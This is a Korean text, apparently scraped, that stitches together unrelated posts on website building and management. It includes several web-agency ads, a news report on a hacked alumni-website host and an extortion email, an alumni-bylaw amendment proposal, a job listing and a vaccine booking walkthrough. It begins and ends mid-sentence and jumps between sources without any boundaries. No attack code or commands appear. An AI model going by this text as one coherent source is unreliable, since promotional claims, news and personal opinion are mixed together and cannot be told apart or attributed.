만나실 수 있습니다.​​​       ​홈페이지 제작에는 다양한 패키지로 구성되어 있으며 그 차이는 퀄리티와 가격입니다. 홈페이지는 사실 만들고자 한다면 30만 원으로도 가능합니다. 하지만 그 결과물은 기대하지 마세요. 30만 원을 투자하면 30만 원의 퀄리티가 나오는 것은 당연하고 그보다 못한 경우도 많습니다. 그리고 이런 가격의 제품들은 정말 만들기만 하고 손을 놔버립니다. 앞에서도 언급하였지만 정말 중요한 것은 홈페이지를 가지고 앞으로 운영을 해야 한다는 것이죠. 저희는 자체적으로 모든 문제를 해결하는 만큼 합리적인 가격을 약속드리는데요. 300만 원의 퀄리티를 150만 원에 진행해드립니다. ​​​       ​홈페이지는 더 이상 pc로 만 이용할 수 있지 않습니다. 스마트폰과 같이 모바일에서도 가능하고 실질적으로 모바일 접속자가 더욱 많죠. 문제는 pc와 모바일에서의 홈페이지 구현은 규격이 다르다는 겁니다. pc와 모바일의 차이는 단순히 모니터와 액정 크기만이 아니라 홈페이지를 구현하는 데에도 있습니다. 저희는 반응형,적응형,하이브리드형과 같이 다양한 방식으로 최적화를 하고 디자인도 변경하는 등 해당 문제를 완벽하게 처리해드립니다.​​​   ​홈페이지를 제작하고 홍보 그리고 홈페이지관리업체로서 저희는 제작 이후 유지 보수도 확실하게 해드립니다. 1:1로 담당자를 배치하고 언제 어디서든지 원하시는 답변을 받아보실 수 있도록 지원해드리고 있는데요. 회사 카카오톡, 이메일, 전화 등으로 언제 어디서든지 문의하시기 바랍니다!​또한 홈페이지를 운영하면서 피할 수 없는 트래픽이나 딜레이와 같은 기술적인 문제들도 저희가 미리 확인하고 체크하여 해결해드립니다.​​​   ​홈페이지관리업체! 에이치엘스토리는 홈페이지에 대한 자체적인 홍보도 진행해드리고 있습니다. 홈페이지를 찾는 소비자들의 검색어 경로 등을 빅데이터로 뽑고 키워드를 선정하여 그에 맞는 맞춤 홍보를 진행해드립니다.​​​   ​홈페이지는 만들기는 어찌보면 쉽습니다. 그러나 퀄리티가 있는 홈페이지는 만들기가 어렵습니다. 취미 수준의 실력과 자본으로는 넘을 수 없는 벽이죠. 여러분들에게는 전문적인 업체가 필요합니다! 에이치엘스토리가 해결 해드리겠습니다!​홈페이지 바로가기 클릭전화상담 바로가기 클릭1588-1815 수백개 동창회 홈페이지 관리업체 해킹 피해…회원정보 유출​ [연합뉴스TV 제공]​(서울=연합뉴스) 장우리 기자 = 고등학교와 대학 동창회, 각종 협회 등의 홈페이지를 관리하는 업체에서 회원들의 개인정보가 대량 유출된 것으로 확인돼 경찰이 수사에 나섰다.​28일 서울 성동경찰서에 따르면 지난달 24일 동창회나 협회 등의 홈페이지를 제작·관리하는 A업체의 서버가 해킹당해 총 387개 단체 회원들의 개인정보가 빠져나갔다.​피해 단체는 서울 경기여고·경복고 등 동창회와 서울시의사회, 대한민국육군협회, 한국산업단지경영자연합회 등으로, 주로 회원 아이디·비밀번호, 연락처, 주소 등이 유출된 것으로 파악됐다.​해커는 업체 측에 "가상화폐 계좌로 돈을 보내지 않으면 개인정보를 유출하겠다"고 협박 메일을 보내기도 한 것으로 전해졌다.​A업체는 해킹 사실을 인지한 후 한국인터넷진흥원에 이를 알리고, 이달 20일 관할 경찰서인 성동경찰서에 수사를 의뢰했다.​경찰 관계자는 "아직 개인정보 유출로 인한 추가 피해는 확인되지 않은 상황"이라며 "업체 서버에 접속한 11개 IP를 특정해 해커의 소재를 추적 중"이라고 밝혔다.​앞서 해당 업체는 2014년 7월에도 중국 IP를 통해 접속한 해커의 공격으로 약 12만건의 개인정보가 유출되는 피해를 본 것으로 알려졌다.​업체 측은 "유출 사실을 인지한 후 해당 서버를 폐쇄하고 홈페이지 이전을 완료했다"며 "필요한 조사를 거쳐 손해배상 등의 구제 절차를 진행하겠다"고 회원들에게 공지했다.​iroowj@yna.co.kr 홈페이지 오픈 후 보완사항을 처리하였습니다.- 로고 수정 및 변경- 메인 슬라이드 마우스 드래그 가능하게- 이미지내 버튼 이미지 삽입- 회원가입/로그인 명칭 변경- 유튜브 마크 및 채널 링크 추가- 메인메뉴 수정 (게시판 추가)< 예정작업 >- SNS로그인 간편회원가입 (재심사 필요)- 카카오톡 알림톡 기능 추가 http://www.vdesign.kr전주 홈페이지제작 브이디자인전북 전주 홈페이지제작 업체/관리, 쇼핑몰 제작/관리, 웹솔루션, 웹프로그램, 개발, 웹디자인, 홈피제작, 견적, 제작비용www.vdesign.kr감사합니다.#전주홈페이지유지보수#전주홈페이지관리#전주홈페이지수정#구인​인컴트랜드에서는 온라인 쇼핑몰 수업도 한창입니다. 보험사무원 양성과정과 쇼핑몰 수업을 찾으시는 수강생분들이 많지요?? 왜!! 왜!! 많은 관심을 가지실까요??​인컴트랜드 학원 보험사무원양성과정은 취업률이 짱짱 합니다.온라인 쇼핑몰은 창업이나 취업을 원하시는 분들이 많이 오시지요? 두 과목다 노하우및 경력들이 대단하신 분들이 수업을 합니다.​후후~~후기 만족도​어느 하나 부족한게 없지요..​​인컴트랜드 홈페이지에 들어오셔서 과정 검색 부탁드려요.​하나 더 구인정보가 자주 업데이트 될거에요. 특히 수료자분들 참고하시면 좋을듯 합니다.​온라인 쇼핑몰 구인의뢰가 들어와 올려볼까 합니다.​주소 : 인천 부평구 부평대로모집 :온라인쇼핑몰근무: 9시~18시급여:협의 (상여금 100%별도)우대조건: 디자인 관련 전공자                 실무교육 3개월이상 자                 MD역할 가능자                 온라인 판매 경력자 ​ ​안녕하세요. 홈페이지 맞춤 제작 및 리뉴얼 전문 업체 가온맥스입니다. 오래된 우리 회사 홈페이지 때문에 리뉴얼을 계획하시나요? 그렇다면 관공서와 대기업 브랜드 홈페이지 제작과 쇼핑몰 제작 경험이 풍부한 전문가가 있는 가온맥스를 주목하세요! 기존의 홈페이지 기능을 + @로 더 많은 리뉴얼 효과를 기대하실 수 있습니다. ​  ​ 홈페이지리뉴얼이 어떤 분들이 필요할까요? -       방문 고객들에게 홈페이지 관리 안 한다는 인상을 팍팍 주는 오래된 홈페이지 디자인-       방문자가 홈페이지에 게시판이나 문의를 남기고 싶어도 알림이 관리자에게 오지 않거나, 담당 관리자의 부재로 홈페이지 관리가 전혀 안되는 업체-       차별화된 세련된 디자인으로 상품도 올리고, 결제도 되고 회원 관리도 할 수 있는 쇼핑몰은 원하는 사장님.-       렌탈 사업을 해서 회원 관리, 렌탈 물품 관리도 홈페이지와 모바일에서 동시에 사용할 수 있으면서 정기 결제와 입금 현황까지 모두 실시간으로 확인할 수 있는 홈페이지를 원하는 사장님​  ​ 가온맥스 홈페이지 리뉴얼 어떠한 서비스를 받을 수 있을까? -       주된 타겟에 맞눈 구성과 키워드로 제작-       깔끔하고 사업에 최적인 디자인-       좋은 콘텐츠를 활용해 지속적인 방문자 유도-       적극적인 마케팅 활용-       고객들에게 신뢰도가 높은 홈페이지를 구축하여 구매전환 유도 가능​  ​ 가온맥스 1+1 이벤트 PC와 모바일 홈페이지를 걱걱 제작할 때 추가로 청구하지 않고 1+1 행사로 PC 홈페이지 제작 비용으로 모바일은 무료로 제작해드립니다. ​코로나로 인한 불황으로 인해 더욱 홍보가 중요해진 이때, 부담을 덜어드리기 위해 가온맥스가 한정기간 진행하는 이벤트입니다.  ​홈페이지리뉴얼에 대한 자세한 문의는 가온맥스 고객센터 1599-2234로 연락해주시면 친절히 상담을 도와드리겠습니다. 홈페이지 제작기간을 고려하여 미리 여유 있게 상담을 신청해주실 것을 부탁드립니다.  가온맥스 고객센터1599-2234 홈페이지 방문하기​​ [해군] 총동창회 ‘홈페이지 관리규칙’ 일부 조항 개정 건의        모교 동문들 간의 교류의 장(場)인 총동창회(옥포회)의 홈페이지 관리규칙상 일부 개정 보완이 요구되는 조항에 대한 검토를 건의합니다.    ‘상정 의제’는 제5조(홈페이지 운용 및 위규사항) 2항 가호의 “정치적 의견”입니다.     먼저, 논의에 앞서 관련 조항을 살피도록 하겠습니다.    제1조 (목적)    1. 해사총동창회 회원 상호간의 친목증진과 정보교환을 촉진한다.    제5조 (홈페이지 운용 및 위규사항)    2. 홈페이지 운용규정 위반사항    가. 정치적 의견, 종교선전 및 타 종교 비방    다음, 개인적인 관련조항 ‘해석’입니다.    제1조 목적에서 “친목증진과 정보교환을 촉진”한다고 규정하고 있는 바, 이것이야말로 최고의 목적이라 함이 마땅합니다.    그러나 ‘정보교환’의 대상과 범위 등이 후속 조항에서 재규정되지 않고 있기 때문에 경직된 유권해석(有權解釋)의 피해가 우려된다 할 것입니다.     즉 제5조 2항 가호를 적용함에 있어서, 마치 ‘프로크루스테스의 침대’인양 경직 적용함으로써, 회원들의 자유로운 의사표현이 제한될 수 있습니다. (이에 관한 사소한 전례가 있었던 것으로 압니다).    이처럼 모호한 사례 발생시마다 적용상의 혼선이 우려되기 때문에 보다 구체화하는 것이 타당하리라 판단됩니다.    나아가 그 어떤 조직이라 할지라도, 법규정의 원활한 집행을 위해서는 때에 따라 논리해석(論理解釋) 내지 유추해석(類推解釋)까지도 허용되어야 한다고 봅니다.    이에 관한 개괄적 개인견해는 일전의 《[해군] “정치 이야기는 하지 말라!” - 정치 담론에 관한 오해!!!》라는 글을 통해 일부 밝힌 바 있으나 약간의 부연하도록 하겠습니다.    법은 과거 왕조 및 전제 시대를 비롯하여 그 어느 시대 어느 정치체제에서든지 다 존재했습니다. 이를 ‘법치’라 합니다.    일반적으로 ‘법치’란 ‘법에 의한 통치’라는 지극히 고착된 사고로 인식하기 쉬우나 여기에는 매우 미묘한 구분이 필요함을 주목해야 할 것입니다.    시간 관계상 학자들의 ‘법치’에 관련된 중요한 견해를 약술하면 이렇습니다. 아래에서 < > 안의 내용은 제 개인적인 보충입니다.    ○ Rule Of Law : 자연법에 의한 통치. <자연법이란 개인과 자유 등 인간 본연의 권익을 고려한 법체계>.    ○ Rule By Law : 실정법에 의한 통지. <실정법이란 외형적인 체계는 갖추었으나 일정 집단의 통치수단 강화를 목적으로 하는 법체계>.    똑같은 ‘법치’임에도 불구하고 Rule Of Low와 Rule By Law는 천양지차입니다. 우리는 최근 페스트트랙이나 부동산3법 등을 통하여 Rule By Law의 무서움을 절절이 체험했습니다.    이상과 같은 법 관련 상식은 우리 총동창회 ‘관리규칙’ 해석시에도 그대로 준용되어야 마땅하다는 생각입니다.    다시 한번 지난번 글의 속내를 반복하면 ‘법을 떠난 개인 생활은 아무 것도 없다!’는 것입니다.    우리는 지금 정치의 피해를 고스란히 감내하고 있습니다. 우리의 전문분야라고 할 수 있는 안보분야는 필설로 형용할 수 없을 정도로 위태지경을 헤매고 있습니다. 자칫 생존을 걱정해야 할 정도입니다. 다 아시므로 생략합니다.    아울러 경제분야도 마찬가지입니다. 거시경제의 몰락은 물론이요 실물경제는 거의 고사 직전입니다. 그리고 이 직격탄이 그대로 개인을 강타하고 있습니다.    혹시 최근 재산세 변동추이를 유념해 보셨나요? 물가도 살펴보셨나요? 범칙금이 어떻게 강화되었는지 아시는지요?    저는 불행하게도 ‘공무원연금수급자’입니다. ‘5년 동결의 철퇴’를 고스란히 맞고 있는 중입니다.    피부에 와 닿지 않는다면 다시 고개를 든 ‘군인 및 공무원 연금 개정’ 움직임에 주목하면 이해가 빠릅니다.     이것은 단순한 애드벌룬이 아닙니다. 반드시 실현될 것입니다. 지금 안심하고 있는 군인연금 손보는 순간이 곧 닥칩니다.    안보든 경제든, 결코 국민 개개인과 동떨어진 남의 나라 일이 아닙니다. 바로 나의 일이요 나의 삶이며 나의 권익입니다.     한 마디로 해서 바로 “개인 삶 = 정치의 연장선!!!”입니다. 공기를 마음껏 들이쉬고 물을 제한없이 마시는 것과 동일한 개념입니다!    지금 우리가 뼈저리게 당하고 있는 모든 불이익이 ‘정치’로부터 파생되는 것이고 그것도 아주 옳게 보이는 ‘법치’의 탈을 쓰고 있다는 점까지 꿰뚫어 보는 지성을 지녀야 합니다.    보다 정확히 말하면 Rule By Law의 폐해인 것입니다!    정리하겠습니다.     각 개인에게 있어서 ‘정치적 思考(정치 이야기)’는 숨 쉬는 공기와 마시는 물과 동일한 일상임을 간과해서는 안 된다는 점을 다시 강조합니다!    ‘정치를 떠난 삶은 없다’는 천리(하늘의 이치)를 등한시한다면, 앞서 장황히 살핀 바와 마찬가지로, 개인과 조직의 생명력마저 위험해 질 수 있습니다.     우리의 관리규칙도 일종의 법체계인 이상 그 해석과 적용에 신중을 기해야 할 것입니다.     길게 살핀 것처럼, 무조건적인 법치(Rule By Law)를 고집할 경우, 그 악영향이 심대할 수 있습니다.    그러므로, 우리의 관리규칙 제5조 2항 가호는 아래와 같이 개정 보완할 필요가 있습니다.     다만, 총동창회가 정치의 장으로 변질되지 않도록 최소한의 단서조항으로 보완할 수도 있을 것입니다.     적법 절차에 따라 공식 처리해 주시기를 건의 드립니다!        ********** << 관리규칙 개정 건의 요약 >> **********    ○ 해당 조항 : 제5조 2항 가호    ○ 심의 안건- 현행 : 정치적 의견, 종교선전 및 타 종교 비방- 개정 : 종교선전 및 타 종교 비방    ○ 필요시 단서조항 보완- “단, 특정정당이나 정치인에 대한 지지 및 반대는 엄격히 금지한다.”홈페이지제작, 홈페이지관리, 홈페이지수정, 블로그관리, 블로그포스팅, 블로그제작, 와짱홈페이지, 와짱블로그안녕하세요~! ​홈페이지랑 블로그에 관심은 많지만 막상 업체를 알아보려면 너무 어려운단어만쓰고정말 궁금한 수정 및 관리 및 글등록에 관한 설명은 없어서 고민인 사장님분들와짱 에서 모든 이 어려운일들을 한번에 도와드립니다.​우선, 홈페이지와 블로그의 차이...홈페이지와 블로그 모두 타이틀 설정이 가능은 해요...그런데 차이는 홈페이지는 집한채(?)를 전부 사용하시면서 방이 2개 ~ 이상 설정이 가능해서방마다 컨셉을 정해서 사용할 수 있어요. 집 문을 열면 대부분 거실이 먼저 보이는 구조이듯, 홈페이지 주소를 열면 제일먼저 거실처럼 보이는 "메인"이 확인가능해요. 그 메인은 사장님의 사업장에 대한 설명이 한눈에 볼 수 있는 글이랑 사진이랑 연락처가 등록되어 있어서" 간판 "과도 같은 역할을 합니다.물론 홈페이지를 어떻게 찾아 들어가는냐도 문제일수 있어요. 도메인주소라고 하는데요 일명 " 집주소 " 처럼 홍보하고자 하는 연락처가 도메인이 되어 포털사이트인 "네이버" 와 "다음"에 등록이 되는거에요​그렇기에 대한민국 어디서든 검색을 하면 확인이 가능하게 등록이 됩니다.그래서 너무 광범위하게 지역을 선택하거나, 이해가 안되는 단순한 단어는 사실상 경쟁력이 치열해서 힘들기에...원하는 지역 제일 자신있는 글을 글로 등록하는 것이 제일 중요합니다.​블로그는 타이틀이 있지만 광범위하게  구분이 되기에 대부분 한장으로만 꽉채우고 말죠뭐 .. 일기장처럼 매일 쓰는게 제일 좋지만...​이런 두가지를 활용하고 싶지만 바쁜 일상속에서 매일 컴터를 켜서 글 입력하고 하루하루 마감하기도 바쁜데 일기처럼 쓰기란 쉽지 않죠​그러기에 와짱 에서 홈페이지 제작 후 수정 및 관리 그리고 블로그 포스팅등록까지 모두안성맞춤으로 진행하고 있어 정말 만족이 되실거에요.​대부분 홈페이지는 등록을 했지만 " 집주소 " 처럼 쓰는 도메인주소 관리랑 홈페이지 안에 내용이 너무 옛날꺼라 바꾸고 싶고 또 내용도 추가할 내용이 있는데 수정이 안되면 사실상 있으나 마나해요그래서 와짱에서 홈페이지를 제작 한 후 수정 및 관리까지 해주니 걱정이 없어요.​블로그는 " 일기장 " 처럼 문구를 입력해주니 네이버에 등록까지 이렇게 좋으니 와~짱이다 라는 탄성이 나옵니다.​누군가가 홈페이지를 열어보고 블로그도 열어봤는데 최근에 사진이랑 문구를 올리면그만큼 업체에 대한 신뢰도가 상승하죠.. 이러므로서 홍보에 큰 도움이 된답니다.문구도 없고 관리가 안되는 홈페이지는 사실상 업체에 대한 믿음이 높지는 않을거에요최근 작업한 사진들이 올라와야 신뢰가 높아질수 밖에 없으니까요...​금액도 홈페이지는 1년동안 네이버에 등록 후 사진등록 및 문구등록 해주는데 264,000원이에요. 사진등록, 문구등록만큼 귀찮고 번거로운 일을 대신해주니 편하고 또등록되면 모바일 홈페이지에서 수정된거 확인도 가능하니 더욱 편하고 믿을만 하죠​블로그는 3개월에 165,000원으로 일주일에 한번씩 한달에 4번을 글 올려주고 사진도 등록해 주고정~말 편하게 이용할 수 있어요​신청해 보고 싶으시다면010-5443-9769에 연락주세요​파워링크 업체분들 광고전화 사절합니다.파워링크는 너~흐 비싸요~~ 1년에 264,000원에 수정 관리까지 자신있으면 연락해도 되요. 그대신~ 파워링크니까 앞에보여야 하는 기준이에요...​ ​ 티스토리 홈페이지 관리하는 방법을 배우다 [위즈돔 티스토리 블로그 교육]    청소년 유해게시물 지정에 이어 꾸준히 나름 열심히 거짓부렁 없이 포스팅함에도 방문자 수를 1/5 이하로 떨어뜨려주는 네이버님에게 휘둘리지 않기 위해서 티스토리 블로그를 열어는 놨는데... 어떻게 해야 할지를 모르겠더라구 ㅎㅎㅎ 그래서 티스토리 교육을 열심히 찾아봤는데 그동안은 없다가 위즈돔에 또로롱하고 열렸다! 그래서 바로 신청했지요 ㅎㅎ    이 날 장소가 망원역이라서 멀기도 했고, 또 서울시의사회의 학회를 오전 9시부터 들은 상태라서 조금 집중력이 떨어진 상태였지만^^;;  나름 열심히 배웠다 ㅎㅎ    티스토리 화면에서 Q 를 누르면 바로 열리는 이 페이지.  이 관리자 페이지에서 할 수 있는 것이 무궁무진하다는 것을 배웠고, 이제 다시 슬슬 티스토리를 관리해보려고 한다. 이번에 청년참 내용 정리하면서도 같이 하려고 했는데 마감에 급해서 같이는 못했지만 작년 7월 부터 진행해온 비우기 모임의 기록을 하나하나 옮겨 보려고~  내년부터는 비우기 모임의 공지 & 신청을 티스토리로 진행하려고 하니까!!다닥유현의 티스토리 블로그 http://1to9.tistory.com/이번 위즈돔을 통해서 게다가 단순히 이론적으로 배우는 게 아니라 같이 해보면서 직접 이것저것 바꿔보면서 할 수 있어서 좋았다!!! 다음에 중급을 대상으로도 한다고 하니까~ 그 때도 시간이 맞으면 참여해봐야지!!티스토리로 멋진 홈페이지형 블로그 만들기 위즈돔 바로가기.  티스토리 홈페이지 관리하는 방법을 배우다 [위즈돔 티스토리 블로그 교육] ​마케팅 자체는 매우 간단한 겁니다. 소비자의 수요를 만족시키기 위하여 상품 또는 서비스를 효율적으로 소비자에게 제공하기 위한 활동이죠. 마케팅은 과거에도 꾸준하게 있었지만 오늘날에는 더욱 그 의존도가 매우 높다고 할 수 있는데요. 오늘날에는 마케팅에 투자되는 비용 역시 엄청나고 스케일도 커지면서 유지하는 데에도 큰 부담이기도 하여 효율적인 홍보가 필요합니다. 에이치엘스토리에서는 실리적인 홍보를 하기 위한 방법으로 상품, 서비스에 대한 공식적인 홈페이지를 제작해드리고 있습니다.  양산홈페이지제작은 물론이고 이를 위한 홈페이지 관리 그리고 자체적인 홈페이지 홍보! 에이치엘스토리에서 하나부터 열까지 모든 것을 빈틈없이 진행해드립니다.​​​  ​양산홈페이지제작에는 에이치엘스토리의 다양한 전문가들이 작업에 임하고 있습니다. 홈페이지의 기준을 잡고 구성을 계획하는 기획자, 그 기획을 받아 살을 붙이고 실질적인 구성을 하는 웹디자이너, pc와 모바일 그리고 태블릿 등 앞으로도 더욱 다양해질 디스플레이 환경에 홈페이지를 구현하고 최적화를 담당하는 웹퍼블리셔 , 홈페이지의 실질적인 정보라 할 수 있는 사진과 영상 등을 제작하고 관리하는 전문 촬영 작가들이 각각 기획팀, 디자인팀, 홍보팀, 미디어팀으로 구성되어 있습니다. 에이치엘스토리는 이들의 역량을 최고로 끌어올릴 수 있도록 지원 역시 아끼지 않습니다. 저희는 자체적으로 스튜디오를 보유하고 있고 촬영 장비, 편집 시설 등 홈페이지 작업에 필요한 모든 것을 대여 없이 자체적으로 해결하고 있습니다. 이러한 탄탄한 제작 환경은 홈페이지 자체의 퀄리티 상승은  물론이고 합리적인 가격으로 귀결됩니다.​​​  ​양산홈페이지제작은 다양한 기술들이 들어갑니다. 그에 맞는 전문가들도 투입되기에 결코 저렴하다고 볼 수 없죠. 업체마다 가격이 다른 이유이기도 합니다. 에이치엘스토리는 모든 작업을 자체적으로 하고 있습니다. 부족한 기술을 채우기 위하여 해당 분야의 프리랜서를 일시적으로 고용하거나 하청업체에게 작업을 맡기는 일이 없다는 뜻이죠. 외주를 맡기는 것 자체는 해당 업계에서는 매우 자연스러운 일입니다. 그러나 또한 자연스럽게 제작비가 상승되는 요인이기도 하죠. 퀄리티 자체도 일정하지 못한 문제도 있습니다. 기획에 맞게 작업을 주문하더라도 작업 자체를 따로 떨어져서 하는 만큼 소통도 어렵고 후에 결과물을 받아보면 퀄리티가 떨어지거나 애초에 기획했던 컨셉에 맞니 않는 경우도 많습니다. ​에이치엘스토리는 모든 작업을 자체적으로 해결하고 모든 팀들이 함께 기획하고 소통을 하면서 작업하는 만큼 퀄리티는 언제나 일정하고 거품을 걷어낸 합리적인 가격을 약속드릴 수 있습니다.​​​  ​양산홈페이지제작은 고객님들의 요청에 맞춤으로 제작이 가능합니다. 크게 3가지 형태가 존재하는데요. 제작 기간 대비 최저가, 최단기간을 원하신다면 스탠다드 실속형!​​​  ​디자인 기획부터 기능 구현까지 프리미엄 제작을 원하시는 분들은 프리미엄형!​​​  ​디자인과 퍼포먼스 그리고 개발까지 말 그대로 맞춤형 홈페이지를 원하신다면 커스텀 맞춤형을 추천드립니다!​​​     ​pc와 모바일 등 다양한 디스플레이에 맞게 홈페이지를 제작해드립니다. pc, 모바일, 태블릿 등 다양한 디스플레이 환경에 맞는 구현 방식을 위하여 반응형, 적응형, 하이브리드형 등의 다양한 방식으로 홈페이지를 제작하고 디자인하며 특히 모바일은 시인성과 가독성을 위해 심플함을 위주로 디자인합니다.​​​  ​제작 이후 유지 보수 역시 확실하게 해드립니다.  1:1 유지 보수 담당자가 고객님에게 배정이 되고 디자인 수정 및 피드백을 모두 담당자에게 알려주시면 바로 답변드리고 작업에 반영하고 있습니다.   홈페이지의 오류, 트래픽 등의 문제들도 저희가 제작한 만큼 빠르게 처리해드립니다. 회사 카카오톡, 이메일, 전화 등으로 언제든 문의 주세요!​​​  ​양산홈페이지제작,관리,홍보 모든 것을 저희 에이치엘스토리에서 원스톱으로 해결해보시기 바랍니다! 더욱 자세한 정보는 아래의 홈페이지를 참고하시거나 전화로 언제든지 문의 주시기 바랍니다!​홈페이지 바로 가기 클릭전화상담 바로 가기 클릭1588-1815 안녕하세요, 식품회사 홈페이지 제작전문 별찌입니다.식품회사 홈페이지에 딱 맞는 최적화된 제작을 해드리는홈페이지 제작업체를 찾으신다면 바로 문의 주세요 :)   정직하고 올바른 먹거리를 제조, 판매하는 식품회사.​그만큼 식품회사홈페이지 제작은 어떻게 제작하느냐가 정말 중요하죠.회사홈페이지가 곧 회사의 이미지, 제품의 신뢰성을 보여주는 만큼 경험과 실력이 보장된 제작 업체에 맡기세요.    최신 홈페이지 트렌드에 맞게 깔끔하고 세련된 홈페이지제작.별찌는 100% 맞춤 제작으로 업체의 맞는, 업체가 원하는 대로고퀄리티의 기획, 구성, 제작이 다 가능합니다.​   소비자들이 믿고 찾고, 구매할 수 있도록식품회사홈페이지제작에는 작은 부분 하나까지 완벽 제작을 해야 합니다.​추가 비용 없이 모바일 홈페이지 제작으로 모바일에서도 언제 어디서든지접근성과 효율성을 높여줍니다.    상품관리, 게시판 관리도 쉽고 빠르게!​초보 관리자도 PC는 물론 모바일로 언제든지 상품 업로드, 텍스트 수정, 이미지 추가 등의홈페이지 관리가 가능합니다.​기기별 자동 적용, 완벽 호환으로 별다른 관리가  필요하지 않아 쉽고 효율적인 관리를 해보세요.   식품회사 홈페이지제작 외에도 다양한 업종, 대기업 홈페이지까지 제작을 한실력과 완벽 관리가 가능한 업체를 찾으신다면바로 문의주세요. 반응형홈페이지 상담신청반응형홈페이지 상담신청, 반응형쇼핑몰 상담신청, 반응형웹 상담신청byulzzi.com 거품 없는 합리적인 비용으로 식품회사 홈페이지 제작을 해드립니다.감사합니다 :)   ​ 천안시 홈페이지 제작 디자인부터 관리비용까지 너무 만족스러웠어요!​ ​​반갑습니다. 요새 소상공인 분들 걱정이 많으시죠. 저도 사실 요새 매출이 전 보다 좋지 않다 보니 걱정이 이만 저만 아닙니다. 그래서 이번에 온라인 마케팅을 하려고 천안시 홈페이지 제작을 알아 봤습니다. 여기 저기 알아 보니 초기 비용이 100만 원 이상으로 정말 비싸더라구요. 하지만 이 곳에서는 최대 32페이지까지 무료로 초기에 제작할 수 있다 합니다. ​​오 이래도 되는건가? 그럼 혹시 디자인이 별로이지 않을까 했는데 전문 디자인이 제작한 여러 가지 탬플릿들을 선택할 수 있어요. 그리고 한 달에 관리비 3만 원만 지불하면 중간 중간 수정도 가능하고 독립형으로 기간이 끝나더라도 내 홈페이지가 될 수 있습니다. 이번 참에 홈페이지 관리법을 익혀둬야 할 것 같아요. 혹시나 5년 이상 사용 시 추가 비용도 없네요.​​그리고 저는 원래 도메인 주소가 지정인 줄 알았는데 이것도 소비자가 요청할 수 있어요~ 그리고 모바일 제작비용까지 무료라고 하니 서두르세요~ 사실 홈페이지 제작이 비싸고 어려울 거라고만 생각햇는데 이 곳을 통해 하니 쉽고 간편하네요. 이제 홍보할 일만 남았습니다. 그리고 혹시나 바이러스나 스팸 등도 고민인데 무료로 방화벽 시스템을 지원해준다고 하니 든든합니다. 다들 힘든 상황 파이팅하세요.  여기서가입할수 있어요! 1. 개발 - 도메인,웹호스팅,디비,홈페이지- 도메인은 되도록이면 사이트명과 맞는 도메인을 정한다.길어도 상관없다. 요즘에 일일이 홈페이지 주소창에 입력하여 들어오는 방문자 잘없다.있다면 정말 주위에 친근한 사람일경우... - 웹호스팅은 규모에따라서 적절하게 선택 홈페이지만의 용량이라면 1GB면 충분하다고 봄.데이터베이스는 약 100MB ~ 500MB 정도.. - 홈페이지를 잘만들어야 한다. 너무 디자인에 치우치기 보다는 웹환경과 검색엔진이 좋아하는 홈페이지를 만들어야 한다.검색엔진은 텍스트를 좋아한다. 사실, 디자인은 만들어 놓으면 그때 뿐이다. 디자인은 자꾸 보면 남에 홈페이지가 더 좋아보이게 마련이다. 디자인에 연연하지 말고 검색이 잘되는  홈페이지를 만들어야한다. 2. 관리 - 개발건에 대한 지속적인 관리- 팝업창- 배너- 페이지추가- 프로그램개발- 플래시제작- 전화번호,오시는길 수정등등.홈페이지관리업체는 이부분에 대해 기간을 기준으로 하는 객관적 데이터를 가지고 있어야한다. 3. 홍보 - 개발과 관리가 지속적으로 이뤄지는 상태에서 홍보- 스폰서링크, 포털사이트의 키워드광고- 카페,블로그를 이용한 온라인 마켓팅- 검색사이트 등록을 통한 일반사이트 등록- 기타 이메일, DM 발송  * 이상 3가지는 서로 유기적으로 보완되어져야 하고 관리되어야한다.아무리 홈페이지 개발을 잘햇다고 해도 관리가 잘 안되면 홍보까지 안된다.아무리 관리를 잘해도 홍보가 안되면 도로묵아무리 홍보를 잘해도 관리가 안되면 돈만 아깝다. 이상 3개를 잘운영하고 있을때 빛을 발하는법..#질병관리본부 #코로아백신접종 #모더나 #50대모더나 #모더나사전예약  ​​  ​​​​오늘은 55세 ~ 59세 모더나 백신 사전예약 포스팅!​​​​오늘부터 모더나 백신 사전예약 시작일이죠 ~​​또으니의 속초할머니, 서울할머니 모두 해당되시는 나이라서 모더나 백신 사전예약을 빨리빨리 해드려야 겠더라구요.​(마음이 불안해서 빨리 백신 맞아야 해요)​​​​​ 신청 및 접종기간​​대상 62년생 ~ 65년생 (만 55세~59세)​신청 기간7월 12일(월) ~ 7월 17일(토)​건보료 가입자 접종기간7월 26일(월)~ 8월 7일(토)​건보료 미가입자 접종기간8월 2일(월) ~ 8월 7일(토)​​​​ ​​​​​​질병관리청 홈페이지를 들어가보아요.​​​​  질병관리청질병관리청www.kdca.go.kr ​​​  ​​​​ ​​​​팝업창이 뜨면코로나 예방접종 사전예약(누리집 바로가기)를 클릭해줍니다.​​​​ ​​​​아침 9시 30분에 접속했는데생각보다 접속대기가 길지 않네요 ~​수월하게 들어갔어요.​​​​​​​  ​​​​​​​사전예약기간 안내를 읽어보고예방접종 예약하기를 눌러보아요.​​​​​​​ ​​​​​​​본인예약, 대리예약 두가지가 있어요.​(휴대폰을 잘 못하시는 어르신들을 위한 것 같아요.  좋다좋다 딱 좋다❤️)​​​​​​​​ 본인예약 과정 ​​​​​​​본인 예약 과정입니다.이름, 주민번호, 본인인증, 전화번호를 입력.​​​​​​​ 대리예약 과정 ​​​​​​​대리예약 과정입니다.​대리예약자 이름, 대리예약자 주민번호, 대리예약자 본인인증, 대리예약자 휴대폰 번호, 접종자 이름, 접종자 주민번호.​(아무래도 대리예약이 입력할 정보가 더 많겠죠 ~?)​​​​예약날짜를 지정하실 때 !​​​7월 마지막주와 8월 첫째주를 다 확인하세요.​7월 마지막주에 날짜 예약이 끝났어도8월 첫째주 달력을 보시면 가능한 날짜가 보일거예요 !​​​(서울할머니 예약 도와드리다가 7월 마지막주 예약일이 다 끝나서 백신 마감인줄 알고 얼마나 식겁했는지...ㅠㅠ8월 첫째주는 예약가능해서 후딱 예약했답니다)​​​​​​  ​​​​​​​​​이렇게 모더나 백신 사전예약 접수를 완료 했습니다.​지역마다 위치마다 예약할 때 어려움이 조금은 있을 수 있을 것 같아요.사람이 몰리면 예약이 꽉 차버릴 수 있으니까요.​​​미리미리 사전예약을 해보세요 !!​​​​​​  안녕하세요. 다산 커뮤니케이션입니다.​홈페이지는 웹사이트라고 불리며, 예전에는 개인용 웹사이트가 월등히 많았으나 현재는 기업이나 공공기관에서 만들어 운영하는 경우가 많습니다. 식당, 병원, 법률 사무소 등 정말 다양한 분야에서 홈페이지를 만들어 이용자에게 편의를 제공하고 있는데요. 홈페이지는 해당 